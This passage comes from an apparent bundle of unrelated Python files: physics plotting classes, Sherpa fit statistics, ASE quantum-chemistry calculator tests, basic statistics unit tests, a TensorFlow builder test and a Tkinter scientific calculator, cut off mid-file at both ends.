0.99],\n                 bands=False,\n                 band_borders=True,\n                 band_brighten=True,\n                 band_alpha=0.5,\n                 binning_dict=None,\n                 likelihood='SAY'):\n        super(LimitedMCHisto, self).__init__()\n        self.calc_components.append(parts.CalcBinning(\n            n_bins=n_bins,\n            binning_dict=binning_dict))\n        self.calc_components.append(parts.CalcHistogram())\n        self.calc_components.append(parts.CalcLimitedMCHistoErrors(alpha,\n                                                                   likelihood))\n        plot_hist = parts.PlotHistAggerwal(log_y=log_y,\n                                           bands=bands,\n                                           band_borders=band_borders,\n                                           band_brighten=band_brighten,\n                                           band_alpha=band_alpha,\n                                           y_label=y_label)\n        self.plot_components.append(plot_hist)\n\n\nclass AggarwalRatio(Element):\n    name = 'AggarwalRatio'\n\n    def __init__(self,\n                 n_bins=50,\n                 y_label='p-value*',\n                 alpha=[0.68, 0.9, 0.99],\n                 zoomed=True,\n                 binning_dict=None,\n                 y_min_log_prob=None):\n        super(AggarwalRatio, self).__init__()\n        self.calc_components.append(parts.CalcBinning(\n            n_bins=n_bins,\n            binning_dict=binning_dict))\n        self.calc_components.append(parts.CalcHistogram())\n        self.calc_components.append(parts.CalcAggarwalHistoErrors(alpha))\n        self.calc_components.append(parts.CalcAggarwalRatios())\n        self.plot_components.append(parts.PlotRatioAggerwal(\n            zoomed=zoomed, y_label=y_label, y_min_log_prob=y_min_log_prob))\n\n\nclass LimitedMCRatio(Element):\n    name = 'LimitedMCRatio'\n\n    def __init__(self,\n                 n_bins=50,\n                 y_label='p-value*',\n                 alpha=[0.68, 0.9, 0.99],\n                 zoomed=True,\n                 binning_dict=None,\n                 likelihood='SAY',\n                 y_min_log_prob=None):\n        super(LimitedMCRatio, self).__init__()\n        self.calc_components.append(parts.CalcBinning(\n            n_bins=n_bins,\n            binning_dict=binning_dict))\n        self.calc_components.append(parts.CalcHistogram())\n        self.calc_components.append(parts.CalcLimitedMCHistoErrors(alpha,\n                                                                   likelihood))\n        self.calc_components.append(parts.CalcLimitedMCRatios())\n        self.plot_components.append(parts.PlotRatioAggerwal(\n            zoomed=zoomed, y_label=y_label, y_min_log_prob=y_min_log_prob))\n\n\nclass Normalization(Element):\n    name = 'Normalization'\n\n    def __init__(self, normalize=None):\n        super(Normalization, self).__init__()\n        if normalize is None:\n            normalize = False\n        if isinstance(normalize, bool):\n            if normalize:\n                normalize = 'sum_w'\n            if isinstance(normalize, str):\n                normalize = normalize.lower()\n                if normalize not in ['test_livetime', 'livetime', 'sum_w']:\n                    raise AttributeError('Possible values for \\'normalize\\': '\n                                         '[\\'test_livetime\\', \\'livetime\\', '\n                                         '\\'sum_w\\', True, False]!')\n        self.calc_components.append(parts.CalcNormalization(normalize))\n", "37": "# \n#  Copyright (C) 2009  Smithsonian Astrophysical Observatory\n#\n#\n#  This program is free software; you can redistribute it and/or modify\n#  it under the terms of the GNU General Public License as published by\n#  the Free Software Foundation; either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU General Public License for more details.\n#\n#  You should have received a copy of the GNU General Public License along\n#  with this program; if not, write to the Free Software Foundation, Inc.,\n#  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n#\n\nimport numpy\nfrom sherpa.utils import NoNewAttributesAfterInit\nfrom sherpa.utils.err import StatErr\nimport sherpa.stats._statfcts\n\n\n__all__ = ('Stat', 'Cash', 'CStat', 'LeastSq',\n           'Chi2Gehrels', 'Chi2ConstVar', 'Chi2DataVar', 'Chi2ModVar',\n           'Chi2XspecVar', 'Chi2')\n\n\nfrom sherpa import get_config\nfrom ConfigParser import ConfigParser\n\nconfig = ConfigParser()\nconfig.read(get_config())\n\n# truncation_flag indicates whether or not model truncation\n# should be performed.  If true, use the truncation_value from\n# the config file.\ntruncation_flag = config.get('statistics','truncate').upper()\ntruncation_value = float(config.get('statistics','trunc_value'))\nif (bool(truncation_flag) is False or truncation_flag == \"FALSE\" or\n    truncation_flag == \"NONE\" or truncation_flag == \"0\"):\n    truncation_value = -1.0\n\n\nclass Stat(NoNewAttributesAfterInit):\n\n    def __init__(self, name):\n        self.name = name\n        NoNewAttributesAfterInit.__init__(self)\n\n    def __repr__(self):\n        if self.__doc__ is not None:\n            return self.__doc__\n        return (\"<%s statistic instance '%s'>\" %\n                (type(self).__name__, self.name))\n\n    def calc_staterror(self, data):\n        raise NotImplementedError\n\n    def calc_stat(self, data, model, staterror=None, syserror=None,\n                  weight=None):\n        raise NotImplementedError\n\nclass Likelihood(Stat):\n    \"\"\"Maximum likelihood function\"\"\"\n    def __init__(self, name='likelihood'):\n        Stat.__init__(self, name)\n\n    @staticmethod\n    def calc_staterror(data):\n        # Likelihood stats do not have 'errors' associated with them.\n        # return 1 to avoid dividing by 0 by some optimization methods.\n        return numpy.ones_like(data)\n\n\nclass Cash(Likelihood):\n    \"\"\"Maximum likelihood function\"\"\"\n    def __init__(self, name='cash'):\n        Likelihood.__init__(self, name)\n\n    @staticmethod\n    def calc_stat(data, model, staterror=None, syserror=None, weight=None):\n        return _statfcts.calc_cash_stat(data, model, staterror, syserror,\n                                        weight, truncation_value)\n\n\nclass CStat(Likelihood):\n    \"\"\"Maximum likelihood function (XSPEC style)\"\"\"\n    def __init__(self, name='cstat'):\n        Likelihood.__init__(self, name)\n\n    @staticmethod\n    def calc_stat(data, model, staterror=None, syserror=None, weight=None):\n        return _statfcts.calc_cstat_stat(data, model, staterror, syserror,\n                                         weight, truncation_value)\n\n\nclass Chi2(Stat):\n    \"\"\"Chi Squared\"\"\"\n    def __init__(self, name='chi2'):\n        Stat.__init__(self, name)\n\n    @staticmethod\n    def calc_staterror(data):\n         raise StatErr('chi2noerr')\n\n    @staticmethod\n    def calc_stat(data, model, staterror, syserror=None, weight=None):\n        return _statfcts.calc_chi2_stat(data, model, staterror,\n                                        syserror, weight, truncation_value)\n\nclass LeastSq(Chi2):\n    \"\"\"Least Squared\"\"\"\n    def __init__(self, name='leastsq'):\n        Stat.__init__(self, name)\n\n    @staticmethod\n    def calc_staterror(data):\n        return numpy.ones_like(data)        \n\n    @staticmethod\n    def calc_stat(data, model, staterror, syserror=None, weight=None):\n        return _statfcts.calc_lsq_stat(data, model, staterror,\n                                       syserror, weight, truncation_value)\n    \n\nclass Chi2Gehrels(Chi2):\n    \"\"\"Chi Squared with Gehrels variance\"\"\"\n    def __init__(self, name='chi2gehrels'):\n        Chi2.__init__(self, name)\n\n    calc_staterror = _statfcts.calc_chi2gehrels_errors\n\n\nclass Chi2ConstVar(Chi2):\n    \"\"\"Chi Squared with constant variance\"\"\"\n    def __init__(self, name='chi2constvar'):\n        Chi2.__init__(self, name)\n\n    calc_staterror = _statfcts.calc_chi2constvar_errors\n\n\nclass Chi2DataVar(Chi2):\n    \"\"\"Chi Squared with data variance\"\"\"\n    def __init__(self, name='chi2datavar'):\n        Chi2.__init__(self, name)\n\n    calc_staterror = _statfcts.calc_chi2datavar_errors\n\n\nclass Chi2ModVar(Chi2):\n    \"\"\"Chi Squared with model amplitude variance\"\"\"\n    def __init__(self, name='chi2modvar'):\n        Chi2.__init__(self, name)\n\n    # Statistical errors are not used\n    @staticmethod\n    def calc_staterror(data):\n        return numpy.zeros_like(data)\n\n    @staticmethod\n    def calc_stat(data, model, staterror, syserror=None, weight=None):\n        return _statfcts.calc_chi2modvar_stat(data, model, staterror,\n                                              syserror, weight,\n                                              truncation_value)\n\n\nclass Chi2XspecVar(Chi2):\n    \"\"\"Chi Squared with data variance (XSPEC style)\"\"\"\n    def __init__(self, name='chi2xspecvar'):\n        Chi2.__init__(self, name)\n\n    calc_staterror = _statfcts.calc_chi2xspecvar_errors\n\n\nclass UserStat(Stat):\n\n    def __init__(self, statfunc=None, errfunc=None, name='userstat'):\n        self._statfuncset = False\n        self.statfunc = (lambda x: None)\n        \n        self._staterrfuncset = False\n        self.errfunc = (lambda x: None)\n        \n        if statfunc is not None:\n            self.statfunc = statfunc\n            self._statfuncset = True\n\n        if errfunc is not None:\n            self.errfunc = errfunc\n            self._staterrfuncset = True\n            \n\n        Stat.__init__(self, name)\n\n\n    def __getstate__(self):\n        state = self.__dict__.copy()\n        # Function pointers to methods of the class\n        # (of type 'instancemethod') are NOT picklable\n        # remove them and restore later with a coord init\n        del state['statfunc']\n        del state['errfunc']\n\n        return state\n\n    def __setstate__(self, state):\n        # Populate the function pointers we deleted at pickle time with\n        # no-ops.\n        self.__dict__['statfunc']=(lambda x: None)\n        self.__dict__['errfunc']=(lambda x: None)\n        self.__dict__.update(state)\n\n\n    def set_statfunc(self, func):\n        self.statfunc = func\n        self._statfuncset = True\n\n\n    def set_errfunc(self, func):\n        self.errfunc = func\n        self._staterrfuncset = True\n\n\n    def calc_staterror(self, data):\n        if not self._staterrfuncset:\n            raise StatErr('nostat', self.name, 'calc_staterror()')\n        return self.errfunc(data)\n\n\n    def calc_stat(self, data, model, staterror=None, syserror=None,\n                  weight=None):\n        if not self._statfuncset:\n            raise StatErr('nostat', self.name, 'calc_stat()')\n        return self.statfunc(data, model, staterror, syserror, weight)\n", "38": "", "39": "import pytest\nfrom numpy.testing import assert_allclose\n\nfrom ase.build import molecule\nfrom ase.calculators.mopac import MOPAC\nfrom ase.io.trajectory import Trajectory\nfrom ase.optimize import BFGS\n\n\n@pytest.mark.calculator\ndef test_mopac(mopac_factory):\n    \"\"\"Test H2 molecule atomization with MOPAC.\"\"\"\n    # Unrestricted Hartree-Fock; enable magmom calc\n    h2 = molecule('H2',\n                  calculator=mopac_factory.calc(label='h2',\n                                                task='1SCF GRADIENTS UHF'))\n    with Trajectory('h2.traj', mode='w') as traj:\n        BFGS(h2, trajectory=traj).run(fmax=0.01)\n    e2 = h2.get_potential_energy()\n    h1 = h2.copy()\n    del h1[1]\n    h1.set_initial_magnetic_moments([1])\n    h1.calc = mopac_factory.calc(label='h1')\n    e1 = h1.get_potential_energy()\n    d = h2.get_distance(0, 1)\n    ea = 2 * e1 - e2\n    print(d, ea)\n    assert abs(d - 0.759) < 0.001\n    assert abs(ea - 5.907) < 0.001\n    h2o = molecule('H2O', calculator=mopac_factory.calc(label='h2o',\n                                                        tasks='GRADIENTS'))\n    h2o.get_potential_energy()\n    print('dipole:', h2o.get_dipole_moment())\n    atoms = MOPAC.read_atoms('h2')\n    print('magmom:', atoms.calc.get_magnetic_moment())\n    print('PM7 homo lumo:', atoms.calc.get_homo_lumo_levels())\n    atoms.calc.set(method='AM1')\n    atoms.get_potential_energy()\n    print('AM1 homo lumo:', atoms.calc.get_homo_lumo_levels())\n    calc = mopac_factory.calc(restart='h1')\n    print('magmom:', calc.get_magnetic_moment())\n\n\n@pytest.mark.calculator_lite\ndef test_mopac_forces_consistent(mopac_factory):\n    \"\"\"Check MOPAC forces follow Newton's 3rd Law\"\"\"\n\n    ch4 = molecule('CH4')\n    ch4.rattle()\n    ch4.calc = mopac_factory.calc(task='1SCF GRADIENTS', method='PM7')\n    forces = ch4.get_forces()\n\n    assert_allclose(forces.sum(axis=0), [0, 0, 0], atol=1e-7)\n", "40": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Thu Nov 29 22:04:24 2020\n\n@author: James\n\"\"\"\nfrom pytest import approx\nfrom calculations_functions import calc_mean, calc_sdv, calc_mode, calc_min, calc_max, calc_median, calc_sdv, calc_median_skewness, calc_mode_skewness\n\ndef test_calc_mean():\n    assert calc_mean([1,2,3]) == 2\n    assert calc_mean([4,2,3,3]) == 3\n    \ndef test_calc_sdv():\n    assert calc_sdv([10, 12, 23, 23, 16, 23, 21, 16]) == approx(4.8989, 0.04)\n    assert calc_sdv([234, 5443, 1 ,10, 12, 23, 23]) == approx(1888.52, 0.02)\n\ndef test_calc_mode():\n    assert calc_mode([1,1,1,2,3,4,5]) == 1\n    assert calc_mode([6,6,6,6,1,2,3,4,5,5]) == 6\n\ndef test_calc_min():\n    assert calc_min([1,2,3,4,5]) == 1\n    assert calc_min([10,1,23231,3,4,5,0]) == 0\n    \ndef test_calc_max():\n    assert calc_max([1,2,3,4,5]) == 5\n    assert calc_max([10,1,23231,3,4,5,0]) == 23231\n    \ndef test_calc_median():\n    assert calc_median([1,2,3,4,5]) == 3\n    assert calc_median([2,2,4,6,6,6]) == 5\n    \ndef test_calc_median_skewness():\n    assert calc_median_skewness([3,8,19,17,24,27]) == approx(0.1166, 0.04)", "41": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "42": "#======================#\n#  Tkinter Calculator  #\n#----------------------#\n#  Konstantinos Thanos #\n#   Mathematician, MSc #\n#======================#\n\n# Import packages\nfrom tkinter import *\nimport math\nimport numpy as np\n\n'''\nFunctions\n'''\n# Function to add in the entry of text display\ndef button_click(char):\n    global calc_operator\n    calc_operator += str(char)\n    text_input.set(calc_operator)\n\n# Function to clear the whole entry of text display\ndef button_clear_all():\n    global calc_operator\n    calc_operator = \"\"\n    text_input.set(\"\")\n\n# Function to delete one by one from the last in the entry of text display\ndef button_delete():\n    global calc_operator\n    text = calc_operator[:-1]\n    calc_operator = text\n    text_input.set(text)\n\n# Function to calculate the factorial of a number\ndef factorial(n):\n    if n==0 or n==1:\n        return 1\n    else:\n        return n*factorial(n-1)\n\ndef fact_func():\n    global calc_operator\n    result = str(factorial(int(calc_operator)))\n    calc_operator = result\n    text_input.set(result)\n\n# Function to calculate trigonometric numbers of an angle\ndef trig_sin():\n    global calc_operator\n    result = str(math.sin(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\ndef trig_cos():\n    global calc_operator\n    result = str(math.cos(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\ndef trig_tan():\n    global calc_operator\n    result = str(math.tan(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\ndef trig_cot():\n    global calc_operator\n    result = str(1/math.tan(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\n# Function to find the square root of a number\ndef square_root():\n    global calc_operator\n    if int(calc_operator)>=0:\n        temp = str(eval(calc_operator+'**(1/2)'))\n        calc_operator = temp\n    else:\n        temp = \"ERROR\"\n    text_input.set(temp)\n\n# Function to find the third root of a number\ndef third_root():\n    global calc_operator\n    if int(calc_operator)>=0:\n        temp = str(eval(calc_operator+'**(1/3)'))\n        calc_operator = temp\n    else:\n        temp = \"ERROR\"\n    text_input.set(temp)\n\n# Function to change the sign of number\ndef sign_change():\n    global calc_operator\n    if calc_operator[0]=='-':\n        temp = calc_operator[1:]\n    else:\n        temp = '-'+calc_operator\n    calc_operator = temp\n    text_input.set(temp)    \n\n# Function to calculate the percentage of a number\ndef percent():\n    global calc_operator\n    temp = str(eval(calc_operator+'/100'))\n    calc_operator = temp\n    text_input.set(temp)\n\n# Funtion to find the result of an operation\ndef button_equal():\n    global calc_operator\n    temp_op = str(eval(calc_operator))\n    text_input.set(temp_op)\n    calc_operator = temp_op\n\n'''\nVariables\n'''\nsin, cos, tan = math.sin, math.cos, math.tan\nlog, ln = math.log10, math.log\ne = math.exp\np = math.pi\nE = '*10**'\n\ntk_calc = Tk()\ntk_calc.configure(bg=\"#293C4A\", bd=10)\ntk_calc.title(\"Scientific Calculator\")\n\ncalc_operator = \"\"\ntext_input = StringVar()\n\ntext_display = Entry(tk_calc, font=('sans-serif', 20, 'bold'), textvariable=text_input,\n                     bd=5, insertwidth = 5, bg='#BBB', justify='right').grid(columnspan=5, padx = 10, pady = 15)\n\nbutton_params = {'bd':5, 'fg':'#BBB', 'bg':'#3C3636', 'font':('sans-serif', 20, 'bold')}\nbutton_params_main = {'bd':5, 'fg':'#000', 'bg':'#BBB', 'font':('sans-serif', 20, 'bold')}\n\n'''\nButtons\n'''\n#--1st row--\n# Absolute value of a number\nabs_value = Button(tk_calc, button_params, text='abs',\n                   command=lambda:button_click('abs(')).grid(row=1, column=0, sticky=\"nsew\")\n# Remainder of a division\nmodulo = Button(tk_calc, button_params, text='mod',\n                command=lambda:button_click('%')).grid(row=1, column=1, sticky=\"nsew\")\n# Integer division quotient\nint_div = Button(tk_calc, button_params, text='div',\n                 command=lambda:button_click('//')).grid(row=1, column=2, sticky=\"nsew\")\n# Factorial of a number\nfactorial_button = Button(tk_calc, button_params, text='x!',\n                   command=fact_func).grid(row=1, column=3, sticky=\"nsew\")\n# Euler's number e\neulers_num = Button(tk_calc, button_params, text='e',\n                    command=lambda:button_click(str(math.exp(1)))).grid(row=1, column=4, sticky=\"nsew\")\n\n#--2nd row--\n# Sine of an angle in degrees\nsine = Button(tk_calc, button_params, text='sin',\n             command=trig_sin).grid(row=2, column=0, sticky=\"nsew\")\n# Cosine of an angle in degrees\ncosine = Button(tk_calc, button_params, text='cos',\n             command=trig_cos).grid(row=2, column=1, sticky=\"nsew\")\n# Tangent of an angle in degrees\ntangent = Button(tk_calc, button_params, text='tan',\n             command=trig_tan).grid(row=2, column=2, sticky=\"nsew\")\n# Cotangent of an angle in degrees\ncotangent = Button(tk_calc, button_params, text='cot',\n             command=trig_cot).grid(row=2, column=3, sticky=\"nsew\")\n# Pi(3.14...) number \npi_num = Button(tk_calc, button_params, text='\u00cf\u20ac',\n                command=lambda:button_click(str(math.pi))).grid(row=2, column=4, sticky=\"nsew\")\n\n#--3rd row--\n# Power of 2\nsecond_power = Button(tk_calc, button_params, text='x\\u00B2',\n             command=lambda:button_click('**2')).grid(row=3, column=0, sticky=\"nsew\")\n# Power of 3\nthird_power = Button(tk_calc, button_params, text='x\\u00B3',\n             command=lambda:button_click('**3')).grid(row=3, column=1, sticky=\"nsew\")\n# Power of n\nnth_power = Button(tk_calc, button_params, text='x^n',\n             command=lambda:button_click('**')).grid(row=3, column=2, sticky=\"nsew\")\n# Inverse number\ninv_power = Button(tk_calc, button_params, text='x\\u207b\\xb9',\n             command=lambda:button_click('**(-1)')).grid(row=3, column=3, sticky=\"nsew\")\n# Powers of 10\ntens_powers = Button(tk_calc, button_params, text='10^x', font=('sans-serif', 15, 'bold'),\n                     command=lambda:button_click('10**')).grid(row=3, column=4, sticky=\"nsew\")\n\n#--4th row--\n# Square root of a number\nsquare_root = Button(tk_calc, button_params, text='\\u00B2\\u221A',\n                     command=square_root).grid(row=4, column=0, sticky=\"nsew\")\n# Third root of a number\nthird_root = Button(tk_calc, button_params, text='\\u00B3\\u221A',\n                    command=third_root).grid(row=4, column=1, sticky=\"nsew\")\n# nth root of a number\nnth_root = Button(tk_calc, button_params, text='\\u221A',\n                  command=lambda:button_click('**(1/')).grid(row=4, column=2, sticky=\"nsew\")\n# Logarithm of a number with base 10\nlog_base10 = Button(tk_calc, button_params, text='log\\u2081\\u2080', font=('sans-serif', 16, 'bold'),\n                   command=lambda:button_click('log(')).grid(row=4, column=3, sticky=\"nsew\")\n# Logarithm of a number with base e (ln)\nlog_basee = Button(tk_calc, button_params, text='ln',\n                   command=lambda:button_click('ln(')).grid(row=4, column=4, sticky=\"nsew\")\n\n#--5th row--\n# Add a left parentheses\nleft_par = Button(tk_calc, button_params, text='(',\n                  command=lambda:button_click('(')).grid(row=5, column=0, sticky=\"nsew\")\n# Add a right parentheses\nright_par = Button(tk_calc, button_params, text=')',\n                   command=lambda:button_click(')')).grid(row=5, column=1, sticky=\"nsew\")   \n# Change the sign of a number\nsigns = Button(tk_calc, button_params, text='\\u00B1',\n               command=sign_change).grid(row=5, column=2, sticky=\"nsew\")\n# Transform number to percentage\npercentage = Button(tk_calc, button_params, text='%',\n               command=percent).grid(row=5, column=3, sticky=\"nsew\")\n# Calculate the function e^x\nex = Button(tk_calc, button_params, text='e^x',\n               command=lambda:button_click('e(')).grid(row=5, column=4, sticky=\"nsew\")\n\n#--6th row--\nbutton_7 = Button(tk_calc, button_params_main, text='7',\n                  command=lambda:button_click('7')).grid(row=6, column=0, sticky=\"nsew\")\nbutton_8 = Button(tk_calc, button_params_main, text='8',\n                  command=lambda:button_click('8')).grid(row=6, column=1, sticky=\"nsew\")\nbutton_9 = Button(tk_calc, button_params_main, text='9',\n                  command=lambda:button_click('9')).grid(row=6, column=2, sticky=\"nsew\")\ndelete_one = Button(tk_calc, bd=5, fg='#000', font=('sans-serif', 20, 'bold'),\n              text='DEL', command=button_delete, bg='#db701f').grid(row=6, column=3, sticky=\"nsew\")\ndelete_all = Button(tk_calc, bd=5, fg='#000', font=('sans-serif', 20, 'bold'),\n              text='AC', command=button_clear_all, bg='#db701f').grid(row=6, column=4, sticky=\"nsew\")\n\n#--7th row--\nbutton_4 = Button(tk_calc, button_params_main, text='4',\n                  command=lambda:button_click('4')).grid(row=7, column=0, sticky=\"nsew\")\nbutton_5 = Button(tk_calc, button_params_main, text='5',\n                  command=lambda:button_click('5')).grid(row=7, column=1, sticky=\"nsew\")\nbutton_6 = Button(tk_calc, button_params_main, text='6',\n                  command=lambda:button_click('6')).grid(row=7, column=2, sticky=\"nsew\")\nmul = Button(tk_calc, button_params_main, text='*',\n             command=lambda:button_click('*')).grid(row=7, column=3, sticky=\"nsew\")\ndiv = Button(tk_calc, button_params_main, text='/',\n             command=lambda:button_click('/')).grid(row=7, column=4, sticky=\"nsew\")\n\n#--8th row--\nbutton_1 = Button(tk_calc, button_params_main, text='1',\n                  command=lambda:button_click('1')).grid(row=8, column=0, sticky=\"nsew\")\nbutton_2 = Button(tk_calc, button_params_main, text='2',\n                  command=lambda:button_click('2')).grid(row=8, column=1, sticky=\"nsew\")\nbutton_3 = Button(tk_calc, button_params_main, text='3',\n                  command=lambda:button_click('3')).grid(row=8, column=2, sticky=\"nsew\")\nadd = Button(tk_calc, button_params_main, text='+',\n             command=lambda:button_click('+')).grid(row=8, column=3, sticky=\"nsew\")\nsub = Button(tk_calc, button_params_main, text='-',\n             command=lambda:button_click('-')).grid(row=8, column=4, sticky=\"nsew\")\n\n#--9th row--\nbutton_0 = Button(tk_calc, button_params_main, text='0',\n                  command=lambda:button_click('0')).grid(row=9, column=0, sticky=\"nsew\")\npoint = Button(tk_calc, button_params_main, text='.',\n               command=lambda:button_click('.')).grid(row=9, column=1, sticky=\"nsew\")\nexp = Button(tk_calc, button_params_main, text='EXP', font=('sans-serif', 16, 'bold'),\n             command=lambda:button_click(E)).grid(row=9, column=2, sticky=\"nsew\")\nequal = Button(tk_calc, button_params_main, text='=',\n               command=button_equal).grid(row=9, columnspan=2, column=3, sticky=\"nsew\")\n\n\ntk_calc.mainloop()\n", "43": "def test_aims_interface():\n    import tempfile\n    import os\n\n    from ase.calculators.aims import Aims\n    from ase import Atoms\n\n    # test the new command handling + legacy behavior\n    aims_command = 'aims.x'\n    aims_command_alternative = 'mpirun -np 4 fhiaims.x'\n    outfilename = 'alternative_aims.out'\n    outfilename_default = 'aims.out'\n    command = '{0:s} > {1:s}'.format(aims_command, outfilename)\n    #command_alternative = '{0:s} > {1:s}'.format(aims_command_alternative, outfilename)\n    command_default = '{0:s} > {1:s}'.format(aims_command, outfilename_default)\n    legacy_command = 'aims.version.serial.x > aims.out'\n    legacy_aims_command = legacy_command.split('>')[0].strip()\n    legacy_outfilename = legacy_command.split('>')[-1].strip()\n\n    # legacy behavior of empty init\n    calc = Aims()\n    assert calc.command == legacy_command\n    assert calc.outfilename == legacy_outfilename\n    assert calc.aims_command == legacy_aims_command\n\n    # behavior of empty init with env variable\n    os.environ['ASE_AIMS_COMMAND'] = aims_command_alternative\n    calc = Aims()\n    assert calc.command == '{0} > {1}'.format(aims_command_alternative, outfilename_default)\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command_alternative\n\n    # legacy behavior of \"proper\" command\n    calc = Aims(run_command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # legacy behavior of an \"improper\" command\n    calc = Aims(run_command=aims_command)\n    assert calc.command == command_default\n    assert calc.aims_command == aims_command\n    assert calc.outfilename == outfilename_default\n\n    # fixed \"command\"  behavior\n    calc = Aims(command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # novel way to use aims_command, no specific outfile\n    calc = Aims(aims_command=aims_command)\n    assert calc.command == command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n\n    calc = Aims(aims_command=aims_command,\n                outfilename=outfilename)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # # testing the setters\n    calc.command = command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n    assert calc.command == command_default\n\n    #calc.set_aims_command(aims_command_alternative)\n    calc.aims_command = aims_command_alternative\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename_default\n    assert calc.command == '{} > {}'.format(aims_command_alternative, outfilename_default)\n\n    calc.outfilename = outfilename\n    assert calc.command == '{} > {}'.format(aims_command_alternative, outfilename)\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename\n\n\n    # test writing files\n    tmp_dir = tempfile.mkdtemp()\n    water = Atoms('HOH', [(1, 0, 0), (0, 0, 0), (0, 1, 0)])\n    calc = Aims(xc='PBE',\n                output=['dipole'],\n                sc_accuracy_etot=1e-6,\n                sc_accuracy_eev=1e-3,\n                sc_accuracy_rho=1e-6,\n                species_dir=\"/data/rittmeyer/FHIaims/species_defaults/light/\",\n                sc_accuracy_forces=1e-4,\n                label=tmp_dir,\n                )\n    try:\n        calc.prepare_input_files()\n        raise AssertionError\n    except ValueError:\n        pass\n\n    calc.atoms = water\n    calc.prepare_input_files()\n    for f in ['control.in', 'geometry.in']:\n        assert os.path.isfile(os.path.join(tmp_dir,f))\n", "44": "from symcalc.plugins.additions.aliases import AddAliases\nfrom tests import TestCalculator\n\n\ndef test_plugin_aliases_instantiate():\n    AddAliases()\n\n\ndef test_plugin_aliases_hook():\n    calc = TestCalculator()\n    plugin = AddAliases()\n    calc.register_plugin(plugin)\n    assert plugin in calc.plugins\n\n\ndef test_plugin_aliases_context_updated():\n    calc = TestCalculator()\n    calc.register_plugin(AddAliases())\n    assert calc.chksym(\"mksym\")\n    assert calc.chksym(\"nCr\")\n    assert calc.chksym(\"ncr\")\n    assert calc.chksym(\"nPr\")\n    assert calc.chksym(\"npr\")\n    assert calc.chksym(\"plot_3d\")\n    assert calc.chksym(\"plot_3d_parametric_line\")\n    assert calc.chksym(\"plot_3d_parametric_surface\")\n    assert calc.chksym(\"graph\")\n    assert calc.chksym(\"graph_implicit\")\n    assert calc.chksym(\"graph_parametric\")\n    assert calc.chksym(\"graph3d\")\n    assert calc.chksym(\"graph3d_parametric_line\")\n    assert calc.chksym(\"graph3d_parametric_surface\")\n    assert calc.chksym(\"differentiate\")\n    assert calc.chksym(\"arcsin\")\n    assert calc.chksym(\"arccos\")\n    assert calc.chksym(\"arctan\")\n    assert calc.chksym(\"arcsec\")\n    assert calc.chksym(\"arccsc\")\n    assert calc.chksym(\"arccot\")\n    assert calc.chksym(\"arcsinh\")\n    assert calc.chksym(\"arccosh\")\n    assert calc.chksym(\"arctanh\")\n    assert calc.chksym(\"arcsech\")\n    assert calc.chksym(\"arccsch\")\n    assert calc.chksym(\"arccoth\")\n    assert calc.chksym(\"sindeg\")\n    assert calc.chksym(\"cosdeg\")\n    assert calc.chksym(\"tandeg\")\n    assert calc.chksym(\"secdeg\")\n    assert calc.chksym(\"cscdeg\")\n    assert calc.chksym(\"cotdeg\")\n    assert calc.chksym(\"asindeg\")\n    assert calc.chksym(\"acosdeg\")\n    assert 